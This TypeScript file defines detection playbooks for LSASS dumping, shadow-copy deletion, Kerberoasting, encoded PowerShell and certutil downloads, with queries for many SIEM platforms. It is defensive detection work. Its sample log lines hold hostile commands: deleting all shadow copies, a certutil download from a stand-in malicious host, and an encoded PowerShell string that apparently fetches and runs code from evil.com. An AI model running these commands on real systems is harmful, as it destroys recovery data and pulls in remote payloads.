import { ThreatPlaybookItem } from '../types';

export const THREAT_PLAYBOOKS: ThreatPlaybookItem[] = [
  {
    id: 'lsass-dumping',
    title: 'LSASS Memory Dumping (Mimikatz / ProcDump)',
    description: 'Detects unauthorized process access or memory reads targeting Local Security Authority Subsystem Service (lsass.exe).',
    category: 'Credential Access',
    mitreTactic: 'Credential Access',
    mitreTechniqueId: 'T1003.001',
    severity: 'Critical',
    tags: ['Mimikatz', 'ProcDump', 'LSASS', 'Credential Theft'],
    sampleLog: 'Process procdump64.exe opened handle to lsass.exe with ACCESS_MASK 0x1410 (PROCESS_VM_READ | PROCESS_VM_WRITE)',
    platforms: {
      sentinel: `SecurityEvent
| where EventID == 4656 or EventID == 4663
| where ObjectName endswith "lsass.exe"
| where AccessMask in ("0x0010", "0x1410", "0x1F0FFF")
| summarize count() by Account, Computer, ProcessName, bin(TimeGenerated, 5m)`,
      defender: `DeviceProcessEvents
| where TargetProcessName =~ "lsass.exe" or ProcessCommandLine has_any ("lsass", "dump", "securlsa")
| where ProcessCommandLine has_any ("procdump", "comsvcs.dll", "rundll32", "sqldumper")
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessCommandLine`,
      splunk: `index=security (EventCode=4656 OR EventCode=4663) ObjectName="*lsass.exe" AccessMask IN ("0x0010", "0x1410", "0x1F0FFF")
| stats count by host, Account_Name, Process_Name
| sort -count`,
      qradar: `SELECT UTF8(payload) as payload, sourceip, destinationip, username 
FROM events 
WHERE deviceType=12 AND (payload ILIKE '%lsass.exe%' AND (payload ILIKE '%0x1410%' OR payload ILIKE '%0x0010%')) 
START ago(24h)`,
      elastic: `process where event.type == "start" and
  (process.pe.original_file_name == "procdump" or process.name : ("procdump*.exe", "rundll32.exe")) and
  process.args : ("*lsass*", "*MiniDump*", "*comsvcs.dll*")`,
      google_secops: `rule detect_lsass_dumping {
  meta:
    author = "SOC Detection Engineer"
    description = "Detects process memory extraction targeting lsass.exe"
    severity = "HIGH"
  events:
    $execution.metadata.event_type = "PROCESS_LAUNCH"
    $execution.target.process.file.full_path = /lsass\\.exe$/i
    $execution.target.process.command_line = /procdump|comsvcs|MiniDump/i
  condition:
    $execution
}`,
      cortex: `dataset = xdr_data
| filter event_type = ENUM.PROCESS and target_process_name = "lsass.exe"
| filter action_process_image_command_line contains "procdump" or action_process_image_command_line contains "comsvcs.dll"
| fields _time, agent_hostname, actor_process_image_name, target_process_name, action_process_image_command_line`,
      securonix: `rg_category = "Endpoint" AND (destinationprocessname = "lsass.exe" OR commandline CONTAINS "comsvcs.dll MiniDump") AND (accessmask = "0x1410" OR accessmask = "0x0010")`,
      logrhythm: `(ProcessName: "procdump.exe" OR ProcessName: "rundll32.exe") AND Command: "*lsass*" AND EventID: 4688`,
      arcsight: `deviceVendor = "Microsoft" AND deviceEventClassId = "4656" AND destinationProcessName = "*lsass.exe" AND accessMask = "0x1410"`,
      gurucul: `category = "Endpoint Analytics" AND target_process = "lsass.exe" AND command_line LIKE "%comsvcs%" AND risk_score > 70`,
    },
  },
  {
    id: 'vss-deletion-ransomware',
    title: 'Ransomware Volume Shadow Copy Deletion (vssadmin / wmic)',
    description: 'Detects attempt to delete or truncate Windows Volume Shadow Copies via vssadmin, wmic, or wbadmin to prevent system recovery.',
    category: 'Defense Evasion',
    mitreTactic: 'Impact / Defense Evasion',
    mitreTechniqueId: 'T1490',
    severity: 'Critical',
    tags: ['Ransomware', 'VSS', 'vssadmin', 'Shadowcopy', 'WMI'],
    sampleLog: 'vssadmin.exe delete shadows /all /quiet execution by user SYSTEM',
    platforms: {
      sentinel: `SecurityEvent
| where EventID == 4688
| where Process =~ "vssadmin.exe" or Process =~ "wmic.exe" or Process =~ "wbadmin.exe" or Process =~ "powershell.exe"
| where CommandLine has_any ("delete shadows", "shadowcopy delete", "resize shadowstorage", "catalog -quiet")
| project TimeGenerated, Computer, Account, Process, CommandLine, ParentProcessName`,
      defender: `DeviceProcessEvents
| where (FileName =~ "vssadmin.exe" and ProcessCommandLine has_all ("delete", "shadows"))
     or (FileName =~ "wmic.exe" and ProcessCommandLine has_all ("shadowcopy", "delete"))
     or (FileName =~ "powershell.exe" and ProcessCommandLine has "Win32_ShadowCopy")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName`,
      splunk: `index=security EventCode=4688 (Process_Name="*vssadmin.exe" OR Process_Name="*wmic.exe") (CommandLine="*delete shadows*" OR CommandLine="*shadowcopy delete*")
| stats count by _time, host, Account_Name, Process_Name, CommandLine`,
      qradar: `SELECT UTF8(payload) as payload, sourceip, username FROM events WHERE deviceType=12 AND payload ILIKE '%vssadmin%' AND payload ILIKE '%delete%shadows%' START ago(12h)`,
      elastic: `process where event.type == "start" and
  (process.name : "vssadmin.exe" and process.args : ("delete", "shadows")) or
  (process.name : "wmic.exe" and process.args : ("shadowcopy", "delete")) or
  (process.name : "powershell.exe" and process.args : "*Win32_ShadowCopy*")`,
      google_secops: `rule detect_vssadmin_shadow_deletion {
  meta:
    description = "Detects Volume Shadow Copy deletion associated with ransomware"
    severity = "CRITICAL"
  events:
    $process.metadata.event_type = "PROCESS_LAUNCH"
    $process.target.process.file.full_path = /vssadmin\\.exe|wmic\\.exe/i
    $process.target.process.command_line = /delete shadows|shadowcopy delete/i
  condition:
    $process
}`,
      cortex: `dataset = xdr_data
| filter event_type = ENUM.PROCESS
| filter action_process_image_name in ("vssadmin.exe", "wmic.exe", "powershell.exe")
| filter action_process_image_command_line contains "delete" and action_process_image_command_line contains "shadow"
| fields _time, agent_hostname, action_process_image_command_line`,
      securonix: `rg_category = "Endpoint" AND (processname = "vssadmin.exe" OR processname = "wmic.exe") AND (commandline CONTAINS "delete shadows" OR commandline CONTAINS "shadowcopy delete")`,
      logrhythm: `ProcessName: "vssadmin.exe" AND Command: "*delete shadows*"`,
      arcsight: `deviceEventClassId = "4688" AND (destinationProcessName = "*vssadmin.exe" OR destinationProcessName = "*wmic.exe") AND commandLine = "*delete*shadows*"`,
      gurucul: `category = "Endpoint Analytics" AND process_name IN ("vssadmin.exe", "wmic.exe") AND command_line LIKE "%delete shadows%"`,
    },
  },
  {
    id: 'kerberoasting-attack',
    title: 'Kerberoasting Attack (SPN Request with RC4 Encryption)',
    description: 'Detects Service Principal Name (SPN) ticket requests (Event ID 4769) using weak RC4 encryption (0x17) to offline crack domain service accounts.',
    category: 'Credential Access',
    mitreTactic: 'Credential Access',
    mitreTechniqueId: 'T1558.003',
    severity: 'High',
    tags: ['Active Directory', 'Kerberos', 'Kerberoasting', 'SPN', 'RC4'],
    sampleLog: 'EventID 4769: A Kerberos service ticket was requested. ServiceName: MSSQLSvc/db01.domain.local TicketOptions: 0x40810000 TicketEncryptionType: 0x17',
    platforms: {
      sentinel: `SecurityEvent
| where EventID == 4769
| where TicketEncryptionType == "0x17" // RC4-HMAC
| where TargetUserName !endswith "$" and TargetUserName !in ("krbtgt", "Guest")
| where ServiceName !endswith "$"
| summarize RequestedTickets = count(), Services = make_set(ServiceName) by TargetUserName, IpAddress, bin(TimeGenerated, 10m)
| where RequestedTickets > 3`,
      defender: `IdentityQueryEvents
| where ActionType == "Kerberos service ticket request"
| where Protocol == "Kerberos"
| extend EncryptionType = tostring(AdditionalFields.EncryptionType)
| where EncryptionType == "RC4" or EncryptionType == "0x17"
| summarize TicketCount = count() by AccountName, IPAddress, bin(Timestamp, 15m)
| where TicketCount > 5`,
      splunk: `index=security EventCode=4769 TicketEncryptionType="0x17" ServiceName!="*$" TargetUserName!="*$"
| stats count as ticket_count values(ServiceName) as requested_services by TargetUserName, IpAddress, _time span=10m
| where ticket_count > 3`,
      qradar: `SELECT UTF8(payload) as payload, sourceip, username FROM events WHERE EventID=4769 AND payload ILIKE '%0x17%' AND payload NOT ILIKE '%$%' START ago(24h)`,
      elastic: `event.code : "4769" and winlog.event_data.TicketEncryptionType : "0x17" and not winlog.event_data.TargetUserName : "*$"`,
      google_secops: `rule detect_kerberoasting {
  meta:
    description = "Detects multiple Kerberos TGS requests with RC4 encryption"
    severity = "HIGH"
  events:
    $kerberos.metadata.event_type = "USER_LOGIN"
    $kerberos.security_result.action = "ALLOW"
    $kerberos.network.application_protocol = "KERBEROS"
    $kerberos.target.user.attribute.roles = /0x17/
  condition:
    $kerberos
}`,
      cortex: `dataset = xdr_data
| filter event_type = ENUM.STORY and action_evt_id = 4769
| filter action_evt_data contains "0x17" and not action_evt_data contains "$"`,
      securonix: `rg_category = "Active Directory" AND eventid = 4769 AND ticketencryptiontype = "0x17" AND NOT targetusername CONTAINS "$"`,
      logrhythm: `EventID: 4769 AND TicketEncryptionType: "0x17" AND NOT ServiceName: "*$"`,
      arcsight: `deviceEventClassId = "4769" AND ticketEncryptionType = "0x17" AND NOT targetUserName = "*$"`,
      gurucul: `event_id = 4769 AND encryption_type = "0x17" AND service_name NOT LIKE "%$" HAVING COUNT(service_name) > 3`,
    },
  },
  {
    id: 'encoded-powershell-execution',
    title: 'Encoded PowerShell Command Execution (-EncodedCommand / -enc)',
    description: 'Detects PowerShell executing base64 encoded payload strings, commonly used by red teams and malware to obscure malicious scripts.',
    category: 'Execution',
    mitreTactic: 'Execution',
    mitreTechniqueId: 'T1059.001',
    severity: 'High',
    tags: ['PowerShell', 'Base64', 'Obfuscation', 'Execution'],
    sampleLog: 'powershell.exe -e aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtACcAKQA=',
    platforms: {
      sentinel: `SecurityEvent
| where EventID == 4688
| where ProcessName endswith "powershell.exe" or ProcessName endswith "pwsh.exe"
| where CommandLine has_any ("-e", "-enc", "-encodedcommand", "-noprofile -e", "-w hidden")
| project TimeGenerated, Computer, Account, ProcessName, CommandLine, ParentProcessName`,
      defender: `DeviceProcessEvents
| where ProcessVersionInfoOriginalFileName in~ ("PowerShell.EXE", "pwsh.dll")
| where ProcessCommandLine has_any ("-enc", "-encodedcommand", "-e ", "/e ")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine`,
      splunk: `index=security (Process_Name="*powershell.exe" OR Process_Name="*pwsh.exe") (CommandLine="*-enc*" OR CommandLine="*-e *" OR CommandLine="*-encodedcommand*")
| stats count by _time, host, Account_Name, CommandLine, ParentProcessName`,
      qradar: `SELECT UTF8(payload) as payload, sourceip, username FROM events WHERE payload ILIKE '%powershell%' AND (payload ILIKE '%-enc%' OR payload ILIKE '%-encodedcommand%') START ago(6h)`,
      elastic: `process where event.type == "start" and
  process.name : ("powershell.exe", "pwsh.exe") and
  process.args : ("-enc", "-e", "-encodedcommand", "-EncodedCommand")`,
      google_secops: `rule detect_encoded_powershell {
  meta:
    description = "Detects PowerShell command execution with encoded payload"
    severity = "HIGH"
  events:
    $ps.metadata.event_type = "PROCESS_LAUNCH"
    $ps.target.process.file.full_path = /powershell\\.exe|pwsh\\.exe/i
    $ps.target.process.command_line = /-(e|enc|encodedcommand)\\s+[a-z0-9+\\/=]+/i
  condition:
    $ps
}`,
      cortex: `dataset = xdr_data
| filter action_process_image_name in ("powershell.exe", "pwsh.exe")
| filter action_process_image_command_line contains "-enc" or action_process_image_command_line contains "-e " or action_process_image_command_line contains "-encodedcommand"
| fields _time, agent_hostname, action_process_image_command_line, actor_process_image_name`,
      securonix: `rg_category = "Endpoint" AND processname = "powershell.exe" AND (commandline CONTAINS "-enc" OR commandline CONTAINS "-encodedcommand")`,
      logrhythm: `ProcessName: "powershell.exe" AND (Command: "*-enc*" OR Command: "*-encodedcommand*")`,
      arcsight: `destinationProcessName = "*powershell.exe" AND (commandLine = "*-enc*" OR commandLine = "*-encodedcommand*")`,
      gurucul: `process_name = "powershell.exe" AND command_line LIKE "%-enc%"`,
    },
  },
  {
    id: 'certutil-file-download',
    title: 'Certutil Living off the Land Remote Binary Download',
    description: 'Detects misuse of Windows built-in certutil.exe utility with -urlcache / -f parameters to download remote malicious binaries.',
    category: 'Command and Control',
    mitreTactic: 'Command and Control',
    mitreTechniqueId: 'T1105',
    severity: 'High',
    tags: ['LOLBIN', 'Certutil', 'Ingress Tool Transfer', 'Bypass'],
    sampleLog: 'certutil.exe -urlcache -split -f http://malicious.domain/payload.exe payload.exe',
    platforms: {
      sentinel: `SecurityEvent
| where EventID == 4688
| where ProcessName endswith "certutil.exe"
| where CommandLine has_any ("-urlcache", "-split", "-f", "http://", "https://")
| project TimeGenerated, Computer, Account, CommandLine, ParentProcessName`,
      defender: `DeviceProcessEvents
| where FileName =~ "certutil.exe"
| where ProcessCommandLine has_any ("urlcache", "split", "http:", "https:")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessCommandLine`,
      splunk: `index=security Process_Name="*certutil.exe" (CommandLine="*urlcache*" OR CommandLine="*split*" OR CommandLine="*http*")
| stats count by _time, host, Account_Name, CommandLine`,
      qradar: `SELECT UTF8(payload) as payload FROM events WHERE payload ILIKE '%certutil%' AND payload ILIKE '%urlcache%' START ago(24h)`,
      elastic: `process where event.type == "start" and process.name : "certutil.exe" and process.args : ("*urlcache*", "*split*")`,
      google_secops: `rule detect_certutil_download {
  meta:
    description = "Detects certutil.exe used to download files from remote URLs"
    severity = "HIGH"
  events:
    $cert.metadata.event_type = "PROCESS_LAUNCH"
    $cert.target.process.file.full_path = /certutil\\.exe$/i
    $cert.target.process.command_line = /urlcache|split/i
  condition:
    $cert
}`,
      cortex: `dataset = xdr_data | filter action_process_image_name = "certutil.exe" and action_process_image_command_line contains "urlcache"`,
      securonix: `rg_category = "Endpoint" AND processname = "certutil.exe" AND commandline CONTAINS "urlcache"`,
      logrhythm: `ProcessName: "certutil.exe" AND Command: "*urlcache*"`,
      arcsight: `destinationProcessName = "*certutil.exe" AND commandLine = "*urlcache*"`,
      gurucul: `process_name = "certutil.exe" AND command_line LIKE "%urlcache%"`,
    },
  },
];
